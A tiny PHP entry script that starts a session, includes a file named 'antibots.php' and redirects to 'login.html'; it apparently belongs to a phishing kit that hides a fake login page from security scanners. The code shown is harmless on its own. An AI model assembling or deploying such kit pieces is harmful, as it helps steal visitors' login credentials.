<?php
ob_start();
session_start();
require_once '../antibots.php';
header("location: login.html");
?>